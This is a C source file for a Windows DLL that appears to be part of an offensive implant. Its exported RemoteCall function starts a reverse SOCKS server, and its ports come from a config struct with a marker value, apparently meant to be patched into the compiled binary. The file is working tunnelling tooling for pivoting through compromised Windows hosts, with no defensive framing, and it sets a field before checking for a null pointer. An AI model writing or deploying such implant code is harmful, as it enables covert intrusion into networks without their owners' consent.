#include "revsocksserver.h"
#include "revsocksl.h"
#include <stdio.h>

typedef struct _CONFIG {
    long long mv;
    int rport;
    int lport;
} CONFIG, *PCONFIG;
volatile CONFIG g_conf = {0xcafebabecafebabe, 0, 0};
bool loaded = true;

extern __declspec(dllexport) void RemoteCall() {
    WSADATA wsaData;
    int iResult;
    
    iResult = WSAStartup(MAKEWORD(2, 2), &wsaData);
    if (iResult != 0)
    {
        return;
    }

    RevSocksServer *rs =  init_revsocksserver(g_conf.rport, g_conf.lport);
    rs->echo = 0;
    if (rs)
    {
        start_revsocksserver(rs);
        free_revsocksserver(rs);
    }
    else
    {
        loaded = false;
    }
}

BOOL WINAPI DllMain(
    HINSTANCE hinstDLL,  // handle to DLL module
    DWORD fdwReason,     // reason for calling function
    LPVOID lpvReserved)
{
    HANDLE hThread = 0;
    // Perform actions based on the reason for calling.
    switch (fdwReason)
    {
    case DLL_PROCESS_ATTACH:
        break;

    case DLL_THREAD_ATTACH:
        // Do thread-specific initialization.
        break;

    case DLL_THREAD_DETACH:
        
        break;

    case DLL_PROCESS_DETACH:

        break;
    }
    return TRUE;  // Successful DLL_PROCESS_ATTACH.
}